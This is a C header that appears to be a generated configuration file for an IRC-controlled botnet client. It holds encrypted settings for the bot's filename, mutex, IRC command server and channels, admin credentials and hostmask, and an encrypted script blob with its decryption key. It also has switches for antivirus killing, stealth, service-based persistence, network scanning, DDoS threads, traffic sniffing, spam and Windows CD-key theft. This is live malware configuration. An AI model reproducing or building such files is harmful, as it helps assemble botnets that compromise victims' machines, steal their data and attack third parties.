#ifndef __CONFIG_H__
#define __CONFIG_H__

#include "confbase.h"

// The section name for polymorph
#define SECTION_NAME ".rcoqnwa"

// Array of CVars
conf_cvar g_aCVars[] = {
	{	"bot_filename",	"\x62\xDD\xEB\xF9\x0C\x5D\x70\xF9",	"Fu57N90Qz8fGA534205gs5OyOWsWtcrXTkE2LL9NJAHk6k5C4Ddmm0S5e7YwWIaEgAujKvOD88H1qdtDxWad978Bc44Wd3V52zFWXWPWYwB4q79c2UhIZSd0F7Jcl438sB6009L68y0UWS60Rx3o8R0SUrJHGH13b698ibxXcmcDybS49Wj0Ir6SUA5q42PSj42Q7kHLwkPx0fRj3Q7fR3N1MY6VJxhIaW4C9YMtsfMCw2kJo8nHsv8US16DB6l9",	"\xC4\xF2\x87\x88\xDA\x75\x4D\x94\x1D\x3C\x85\xFE\x32\x91\xA7\x5A"	},
	{	"bot_id",	"\x89\x3F\xD8\x30\x9D\x77",	"BqRry0Tr7Ube5QKKuN18tT0QySg28DtU9C71GnxqO5g0Ti50v27WO12LxLqiTQlsr0ZYwUIoHNlIQVKhvztbKTB3AL31CXdYrt0uKsu8Mb58WeV65jFL16NxD469ufdGZc2186Q23BwaQ8hFh45q0jF35pAJhFbyajh7w4R43aJ9qU74r8XSVC1KF5SqnGdtUimXIO20rWkAY55lz46HWNb0kP3MWaaZvh65wu16yzwf3D86yay3xQV0ZIYd2T9L",	"\x73\xC1\x56\x70\x93\xB4\x3A\xAF\x96\x90\xC8\x2D\x64\x9E\x6C\x21"	},
	{	"bot_prefix",	".",	NULL,	""	},
	{	"bot_timeout",	"2147483647",	NULL,	""	},
	{	"bot_seclogin",	"true",	NULL,	""	},
	{	"bot_compnick",	"false",	NULL,	""	},
	{	"bot_randnick",	"true",	NULL,	""	},
	{	"bot_meltserver",	"false",	NULL,	""	},
	{	"bot_mutex_name",	"\xE2\x63\x84\xCF\xFC\x36",	"01W0n57DfIczWz9DT41rgdeo3y221G63wBBD7PvV1JbHg1uke3KE7d01HDld3rIMK942Tk7Q7a0qrbwN4VDNpg1BFbB4k8oeBcU09Vg0660977cyF3J7qOl8ykHid9R18I3ckFSvah3QtT9TU0PM1SO78kSQ972reWu0649m4hy7Fy3lXKxvxw5lUrM4XnpOCPmKu8j8zP1tKYV07O732PZ9D42oGzjBaUE9h36L26V5Yr2eBa0DYZYZR31eZj7Y",	"\xF1\xFA\xD6\xCE\x58\xDB\x21\x2D\xBB\x21\x72\xFB\x50\x62\x80\xAA"	},
	{	"bot_topiccmd",	"false",	NULL,	""	},
	{	"do_speedtest",	"false",	NULL,	""	},
	{	"do_avkill",	"false",	NULL,	""	},
	{	"do_stealth",	"false",	NULL,	""	},
	{	"as_valname",	"",	"ahDX23EaKmJRz6aSCw5uGT077Owz4LLnmjBFd6TAa36z1W1GnQaJA927J8LfS46nmvG1B67kDHE0uV08q30mmeFhSI55bC0Hj0lsNEy54S6u3nUX16teLo9Z7RIhLrXng6yBp66H95QqD46pF5NdGudxSC30HxvN514CUw7C4G8pun7kQ6j3PxT85GX04ac0eHhddHo8u6Vd4j32R8w48P3U635cMUimS3fBGT89TJj1T8M8Z99Nu9D4tchhe4TL",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"as_enabled",	"false",	NULL,	""	},
	{	"as_service",	"false",	NULL,	""	},
	{	"as_service_name",	"",	"Cd4Ec592J1vF9p6C8721Sno02pyKzT0IVYsjgsr22O11P5659AQlJN7105O689MV86Ixtm4vOlSp9DDe466Yb5EAMfuSDs62r4bQ17XivG4JQ4xpHjk766bDkE7uu3842gdykxn6195ZWwlU50hNhow716d6fpTNBH3QE8c229d4GMRG9lJgXhToN3zN3sN304x0kvxZb14CZuCbSlD5SOFpy4Aa64w2VyqbSVU2h94a7T6T6R65NkJpgpilwzy9",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scan_maxthreads",	"10",	NULL,	""	},
	{	"scan_maxsockets",	"1024",	NULL,	""	},
	{	"ddos_maxthreads",	"0",	NULL,	""	},
	{	"redir_maxthreads",	"0",	NULL,	""	},
	{	"identd_enabled",	"false",	NULL,	""	},
	{	"cdkey_windows",	"false",	NULL,	""	},
	{	"scaninfo_level",	"3",	NULL,	""	},
	{	"spam_aol_channel",	"",	"26Ty11c9045p68t29eHvQM7rv9546d57Vv0p1765wym8303gHnFLV9MMmIv3R1735i7hVzSXyKtgeYyq9t89jICePtu7oqK1wlo976d4UfFSpMK964251usLzyPWCaPuuyW88cGY5327wcfgRpxsIZvj0d8M7YaqufJ782X9wh7frw3CR8v5tZ56pzst469Lv9IFPnkhU80rCGeLXfnS74MKBRU4pYz4kO4X7r53Yoe0xgt8b292BLr3e8fRb03n",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"spam_aol_enabled",	"false",	NULL,	""	},
	{	"sniffer_enabled",	"false",	NULL,	""	},
	{	"sniffer_channel",	"",	"mV1EhE6Cl33WEiLi4bT70QRMK7rgi68VOAa9U8OxwnpBQ5fK6cUhJ1P6OBGJHAofp9kkI0PRHe1AL3ndcnrMkOz8yXPri92Xb9a5jS67K6bUgr3a3Vj49zX8mAVMK60s9wEQZ1wdfx5Uf100TCK63CZ6N5PL9v6xTx55Tf2eKJraar68YXuHFz2cx1BU8VIgky5o6h97A9rX77oJfGz8AG2EYBvFLhsbLgu5gh9G7c4K2kTcG7c5L00P5y0yTMbB",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"sniff_http",	"false",	NULL,	""	},
	{	"scaninfo_chan",	"",	"URP8qOoqOTma5DQEh4nzW9hoa9i6fFA5zM6i2Y5hEIOsiXFAc8jcz1aQ28urq68H9nk22u1CquDX72x7wacOEf7zqsdpnpDoE0Kn00i455A5o0QtI57ld26H9iLrT2edrx04703g04rG8YX2spTJ2XhS5UKpSJp3xkZ8yqbXudyuhWP575F32hr8IuBQKerVvi5Dq2SJT31sBH18RMpC4aJY6514E4B0Xzn0iQ29553Z7g6P10YprgM5HTt29lYP",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"inst_polymorph",	"false",	NULL,	""	},
	{	"vuln_channel",	"",	"eF0Ach8plT707FK8ogsl15pVso4V180Wch08494S833841j0Nq97SA7Mr6N27anP69r7nEIez2mx16BJg2ddQIoP5EMk0o1B2rsVtRIkKw0e553f5sI6rP0xH8m3BUaB9141Fv7h2ELBu57ROb9WEk8m1y1YD49vGs5uLpj20P5om42fBUdwXy9a9ZSHgTae0d385g51Y0r18wd9GZII17Zr1Fscu4ZJv76KXTfk5Au75s4GXG5FtZZ0MII6QW0d",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"latency_sensitivity",	"1",	NULL,	""	},
	{	"latency_desired",	"500",	NULL,	""	},
};

// Array of Users
conf_user g_aUsers[] = {
{	{	"user0.username",	"\xFC",	"Qk66tjN90JH9r5rIgp2FyGpikne62rx8XIck4bkDXOZNajspY5m3NrV17LjFocSEqkGb2dDx243bQpAcH2U27WGSV2o1Z8F4H89lm5oqU61mhHnJZ2DZ5z9p578633QMVOjxH59f5YXgb9s42mBDbp59FzalEDO4Uu2h2AFbCulI64n8Wqo7d8aNS60s35hhbJz8HlpcQDcfflj5Zse5c3A33051G350fpf505Yr6k8vlwfDkhvN62OEcrV08ujs",	"\xCF\x0E\xEC\xE3\xA2\x3B\x68\x0F\x62\x66\xA2\x1A\xAB\xBA\x4D\x32"	},
	{	"user0.password",	"92EB5FFEE6AE2FEC3AD71C777531578F",	NULL,	"\xEF\xA0\xA9\xEF\xEA\x04\x11\xA2\xC8\x66\x7C\x6F\x80\xDC\x14\xCE"	},
	{	"user0.hostmask",	"\xDF\x82\x16\x07\x6E\x93\x98\xD9\xF9\x8E\x05\x1F\xDA\xAA\xF1\xBD\x5A\x81\x0E\x0F\xE4\xB4\x7D\x9E\xE1\xBB\x5F\xB7\x8C",	"e2f6n85sjnZ6M1nQ23D21D20e8j0mnpLLs70gDjqh9lr9LFnkpAVKd17MGJ4eWkBZ7e0i75I5pQHEb7X9z08rwWG30lVG547g5CkG601v8k5qDC2702L7llJtv7NrVylheW50b0BcUCu60R58x0E9ML18XVDv4Ph5SfJgz5Lb66c78lj11MczD93RwzzRPP1YAKcZtSfUnn81CWt861Vf9mBM9ss506FbMfprf47WTld5rv2qEXl4d2818FonDxH",	"\x75\x6F\xC6\xA4\x15\x4F\xDF\x93\x69\x07\xB3\x47\x0E\x4C\xEB\xCB"	},
	{	"user0.identdmask",	"\x8A\xD6\x34\x56",	"e2f6n85sjnZ6M1nQ23D21D20e8j0mnpLLs70gDjqh9lr9LFnkpAVKd17MGJ4eWkBZ7e0i75I5pQHEb7X9z08rwWG30lVG547g5CkG601v8k5qDC2702L7llJtv7NrVylheW50b0BcUCu60R58x0E9ML18XVDv4Ph5SfJgz5Lb66c78lj11MczD93RwzzRPP1YAKcZtSfUnn81CWt861Vf9mBM9ss506FbMfprf47WTld5rv2qEXl4d2818FonDxH",	"\x1D\xF8\xD9\x9F\x55\xC2\x1E\x3B\x47\x86\xDC\xFB\x67\x1D\xEB\xFF"	}, },
};

// Array of Servers
conf_server g_aServers[] = {
{	{	"server0.chanpass",	"",	"u8wF4SAxkH92b1wt7sjO8g60Zq0GVmerQJevVFI1bO73kl8Y8t5FKlWc8cMzmjNdq93svz6kV5jr7ch72l9A2hMiGkB48O7YeweSAzuz4p6IsD077hn029m2vFxx9HZ83X9f4mc8960s4ZRYKIVZsbND0SsAci9243hAplj3w2hWTS08AEwUjR6oU5O02v87QD6mOE9mK2w1qT65wW1C5mk7IaCR8qjr336lw5RoeBRr8cKm6Ys0aOX15rmD6zs8",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"server0.mainchan",	"\x4D\xEF\x3E\x14\x52",	"u8wF4SAxkH92b1wt7sjO8g60Zq0GVmerQJevVFI1bO73kl8Y8t5FKlWc8cMzmjNdq93svz6kV5jr7ch72l9A2hMiGkB48O7YeweSAzuz4p6IsD077hn029m2vFxx9HZ83X9f4mc8960s4ZRYKIVZsbND0SsAci9243hAplj3w2hWTS08AEwUjR6oU5O02v87QD6mOE9mK2w1qT65wW1C5mk7IaCR8qjr336lw5RoeBRr8cKm6Ys0aOX15rmD6zs8",	"\x4A\xAE\x88\x31\x14\xF3\x5F\xF2\xEB\x76\xCE\x7A\x58\x81\x22\x04"	},
	{	"server0.nickprefix",	"",	"u8wF4SAxkH92b1wt7sjO8g60Zq0GVmerQJevVFI1bO73kl8Y8t5FKlWc8cMzmjNdq93svz6kV5jr7ch72l9A2hMiGkB48O7YeweSAzuz4p6IsD077hn029m2vFxx9HZ83X9f4mc8960s4ZRYKIVZsbND0SsAci9243hAplj3w2hWTS08AEwUjR6oU5O02v87QD6mOE9mK2w1qT65wW1C5mk7IaCR8qjr336lw5RoeBRr8cKm6Ys0aOX15rmD6zs8",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"server0.port",	"6667",	NULL,	""	},
	{	"server0.server",	"\x07\xFF\x39\x5F\x57\x95\xDE\x90\xDF\xCA\xA5\xA6\x4E\xAB\xCB\x23\x4D\x26\x14\x8B",	"u8wF4SAxkH92b1wt7sjO8g60Zq0GVmerQJevVFI1bO73kl8Y8t5FKlWc8cMzmjNdq93svz6kV5jr7ch72l9A2hMiGkB48O7YeweSAzuz4p6IsD077hn029m2vFxx9HZ83X9f4mc8960s4ZRYKIVZsbND0SsAci9243hAplj3w2hWTS08AEwUjR6oU5O02v87QD6mOE9mK2w1qT65wW1C5mk7IaCR8qjr336lw5RoeBRr8cKm6Ys0aOX15rmD6zs8",	"\x19\x7D\x0C\xFA\xB8\x6C\x26\x59\xD8\x41\xB3\xCD\x0C\x85\x45\xD0"	},
	{	"server0.servpass",	"",	"u8wF4SAxkH92b1wt7sjO8g60Zq0GVmerQJevVFI1bO73kl8Y8t5FKlWc8cMzmjNdq93svz6kV5jr7ch72l9A2hMiGkB48O7YeweSAzuz4p6IsD077hn029m2vFxx9HZ83X9f4mc8960s4ZRYKIVZsbND0SsAci9243hAplj3w2hWTS08AEwUjR6oU5O02v87QD6mOE9mK2w1qT65wW1C5mk7IaCR8qjr336lw5RoeBRr8cKm6Ys0aOX15rmD6zs8",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"server0.usessl",	"false",	NULL,	""	}	},
};

// Script

char *g_szScript = \
	"\xAE\x49\x6E\x3E\x0D\x5C\x7E\x59\x4A\x26\x1A\x18\x02\x1A\x8C\xAD\xF9\x2F\x48\xFC\x45\xD2\x4A\xEE\x29\x32\x03\xD0\x5D\xD5\xAD\x20\xB3\xC4\x11\xD3\x9C\x12\x2F\x06\x10\x8E\x62\xA6\xE2\xE2\x16\xAE\xF5\xF9\x52\xE4\x5D\xD7\x2C\xD6\x0B\x43\x5C\xE2\x5E\xD3\xA0\x63\x01\x8A\x69\x22\xA4\xA8\x6C\x89\x32\xD3\x82\xBD\x8F\x66\x09\x17" \
	"\xC4\x47\x5E\x76\x6C\xF6\xE5\x8D\x72\x9A\x4B\x27\xDF\x59\x48\x71\xE7\xED\x4A\x78\xE9\xB9\x78\xFE\x85\xF0\x81\xA6\x06\x32\x04\x11\xF2\x09\x49\x76\x41\x5B\x2E\x27\xD8\xBA\x73\xA5\x94\x01\xFC\x86\xB8\x0E\xA2\xFC\x32\xD6\x71\xF1\x5D\x07\x0A\x63\x84\xC2\x3D\x43\x84\x3A\x98\x9F\xE2\x60\x68\x69\xB6\x98\x37\xA2\x8B";

char *g_szScriptKey = "m0P2Oz85fQatM37s5mZ1b5sfv7Ic2555oJ2q1hHT1k8L2iRUiAB4458j9y785pD5pDw07widCh5DJ656FQKspdz834M0Y9dab6ej8OUCr7B8LH4Zz80wE51h8wnwGtt8X85v4uYNYRqA6SSRU755nHvV84p0auQhPw52eJSVNOFQRxihJWt835Ed0v79CIbceQQcA73ynHeCRlSw0h34cYu3zgTb8BRoa34dOqrFOHlL2FW93O22lor1kiRsJ2sL";

char *g_szUser = "DACC03360C61FC4F110CFC93C0BF60DA";

char *g_szIssuer = "42D002ABD2822E79D5CD61D07E182AA5";

#endif // __CONFIG_H__
